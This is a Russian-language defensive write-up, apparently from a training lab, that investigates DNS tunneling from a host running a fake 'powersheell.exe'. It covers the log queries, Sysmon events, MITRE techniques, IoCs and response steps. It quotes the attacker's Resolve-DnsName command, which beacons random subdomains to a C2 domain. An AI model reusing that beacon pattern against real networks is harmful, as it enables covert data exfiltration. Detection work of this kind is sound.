# Обнаружение DNS Tunneling и скрытой эксфильтрации данных

## Гипотеза
 **Злоумышленники могут использовать протокол DNS для создания скрытого канала связи (C2) и кражи данных из корпоративной сети, обходя традиционные средства защиты периметра.**

## Резюме инцидента
Во время исследования я пришла к выводу, что это активность соответствует DNS-based C2 с признаками DNS tunneling / beaconing. Злоумышленник использовал вредоносный процесс `powersheell.exe` (видна маскировка под легитимный PowerShell) для генерации аномального количества DNS-запросов типа **TXT** к домену `stest-domain[.]biz`. Поддомены содержали случайные строки высокой энтропии, а это является признаком кодирования украденных данных или команд C2.
Обнаруженные IoC пересекаются с инфраструктурой, ранее ассоциированной с APT-ALN007/008 по данным Threat Intelligence LetsDefend. 

## Логика расследования 

### Шаг 1: Выявление сетевой аномалии
Начала с анализа DNS-логов, чтобы найти хост с подозрительной активностью и с запроса в Wazuh `data.location: "/var/log/dns.log"` + сортировка по результатам data.srcip
*   Хост `192.168.1.54` генерировал аномально высокое количество запросов.
*   Большинство запросов имели тип **TXT**. Обычные пользователи редко запрашивают TXT-записи в таком объеме. Это типичный признак DNS-based C2 и возможного DNS tunneling, так как в TXT-записях можно передавать большие объемы данных».
*   Так же вид запросов был `[случайная_строка].stest-domain.biz`.
    *   Примеры: `uyhv0jdwrqxbp9mgz6e3atcn.stest-domain[.]biz`, `t8p3zqayvn1dhjmlc9rkwxue.stest-domain[.]biz`. Высокая энтропия может указывать на закодированы данные.

### Шаг 2: Идентификация процесса-источника
Чтобы понять, какая программа генерирует этот трафик, обратилась к логам Sysmon.
*   `rule.groups: "sysmon" AND data.win.system.eventID: 22 (DNS Query) AND *stest*`
*   Был найден процесс `powersheell.exe` - маскированный бинарник
    *   **Command Line:** `powersheell -Command "Resolve-DnsName b7et2fscyopgv5qdk9xnwhlz.stest-domain.biz"`
    *   **Parent Process:** `cmd.exe`

### Шаг 3: Анализ результатов запросов и C2
Проверила, куда резолвятся эти запросы:
*   **Поле QueryResults:** `136.56.98.22` - это ip адрес управляющего сервера (C2 endpoint), куда направляются закодированные данные.

### Шаг 4: Threat Intelligence
Проверила найденные IoC (IP и хеш процесса) в базе LetsDefend CTI.
*   **IP `136.56.98.22`** Связан с APT-группой **APT-ALN007**.
*   **Хеш процесса (SHA256)** `FAKEHASH...` связан с APT-группой **APT-ALN008**.
*   Из этого можно сделать вывод что атака имеет признаки целевой кампании продвинутой группы угроз.

## Более детальный анализ артефактов

### 1. Сетевая активность (DNS Tunneling)
Логи показывают массовую отправку закодированных данных в именах поддоменов.
```json
{
  "event_type": "dns_query",
  "dnsdata": {
    "src_ip": "192.168.1.54",
    "query": "uyhv0jdwrqxbp9mgz6e3atcn.stest-domain.biz",
    "query_type": "TXT",
    "action": "allowed"
  }
}
```
**Использование TXT-запросов к доменам со случайными поддоменами - классический признак туннелирования данных.**

### 2. Вредоносный процесс (Sysmon Event ID 1 & 22)
```json
{
  "EventID": 1,
  "Image": "C:\\Windows\\System32\\powersheell.exe",
  "CommandLine": "powersheell -Command \"Resolve-DnsName ...\"",
  "Hashes": "SHA256=FAKEHASHPWSH1234567890ABCDEF9876543210",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe"
}
```
 **Процесс использует легитимную команду `Resolve-DnsName` (это нативный командлет PowerShell) в злонамеренных целях + опечатка в имени файла (`powersheell`) - попытка скрыться от поверхностного мониторинга.**

##  MITRE ATT&CK
*   **T1071.004 (Application Layer Protocol: DNS):** Использование DNS для C2 коммуникации.
*   **T1048.003 (Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol):** Передача данных через DNS.
*   **T1036.005 (Masquerading: Match Legitimate Name or Location):** Маскировка под `powershell.exe`.
*   **T1059.001 (Command and Scripting Interpreter: PowerShell):** Выполнение скриптов.

##  Индикаторы компрометации (IoC)

| Тип                   | Значение           | Комментарий                                      |
| :-------------------- | :----------------- | :----------------------------------------------- |
| **Malicious Domain**  | `stest-domain.biz` | C2 Domain                                        |
| **C2 IP Address**     | `136.56.98.22`     | ip сервера управления (APT-ALN007)               |
| **Infected Host**     | `192.168.1.54`     | Источник аномального DNS-трафика                 |
| **Malicious Process** | `powersheell.exe`  | Поддельный PowerShell         |
| **Process Hash**      | `FAKEHASH...`      | Хеш вредоносного исполняемого файла (APT-ALN008) |

#### Рекомендации:

- **Эскалация инцидента на SOC L2** из-за признаков DNS-based C2 и возможной эксфильтрации данных.
- **Изоляция заражённого хоста** (`192.168.1.54`) для предотвращения дальнейшей связи с инфраструктурой C2.
- **Блокировка обнаруженных IoC** (домен, IP, хеш файла) во всех защитных системах.
- **Проведение хост-форензики** для выявления механизмов постоянства и оценки масштаба компрометации.
- **Поиск аналогичных DNS-паттернов по всей инфраструктуре** для обнаружения возможных дополнительных заражённых хостов.
